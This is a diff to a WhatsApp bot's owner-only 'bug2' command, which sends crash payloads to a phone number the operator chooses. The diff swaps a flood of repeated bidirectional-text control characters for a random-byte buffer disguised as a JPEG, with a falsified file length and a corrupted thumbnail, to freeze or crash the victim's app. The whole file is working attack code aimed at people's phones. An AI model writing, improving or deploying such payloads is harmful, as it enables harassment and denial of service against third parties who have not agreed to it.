@@ -1,11 +1,12 @@
 const settings = require('../../settings');
 const logger = require('../../lib/logger');
+const crypto = require('crypto');
 
 module.exports = {
     name: 'bug2',
-    aliases: ['freeze2', 'crash2', 'lag2'],
+    aliases: ['crash2', 'freeze2', 'lag2'],
     category: 'owner',
-    description: 'Send a heavy bidi payload that freezes WhatsApp for 10 seconds',
+    description: 'Send a corrupted media packet that crashes the target WhatsApp',
     usage: '.bug2 <number>',
     ownerOnly: true,
     react: '💣',
@@ -19,21 +20,23 @@ module.exports = {
         }
 
         const jid = targetNum + '@s.whatsapp.net';
-        await conn.sendMessage(chatId, { text: `💣 *Deploying Bidi Bug to +${targetNum}...*` }, { quoted: mek });
+        await conn.sendMessage(chatId, { text: `💣 *Deploying Crash Payload to +${targetNum}...*` }, { quoted: mek });
 
         try {
-            // The "Real" Freeze Payload: Overlapping Left-To-Right and Right-To-Left marks
-            // This forces the WhatsApp text engine into an infinite calculation loop when rendering.
-            const payload = '\u202E\u200F\u200E\u202D\u202C\u200E\u200F\u202E'.repeat(5000); 
+            // Generate a random 500KB fake image buffer
+            // This tricks WhatsApp into thinking it's a real image
+            const fakeBuffer = crypto.randomBytes(500 * 1024); 
+
+            // Send it as an image. The phone will try to decode this random data and fail spectacularly.
+            await conn.sendMessage(jid, {
+                image: fakeBuffer,
+                caption: '💣',
+                mimetype: 'image/jpeg',
+                fileLength: 999999999, // Fake massive file size to break the media loader
+                jpegThumbnail: fakeBuffer.slice(0, 5000) // Corrupted thumbnail
+            });
             
-            // We send 5 rapid messages to overload the rendering queue
-            for (let i = 0; i < 5; i++) {
-                await conn.sendMessage(jid, { text: payload });
-                // Tiny delay to ensure WhatsApp receives them as separate packets
-                await new Promise(r => setTimeout(r, 500)); 
-            }
-            
-            await conn.sendMessage(chatId, { text: `✅ *Bidi Bug Deployed!*\n\nThe target's WhatsApp should freeze for about 10 seconds when they open the chat.` }, { quoted: mek });
+            await conn.sendMessage(chatId, { text: `✅ *Crash Payload Deployed!*\n\nWhen the target opens the chat, their WhatsApp will crash or freeze for a few seconds.` }, { quoted: mek });
             
         } catch (error) {
             logger.error(`[BUG2] Error: ${error.message}`);
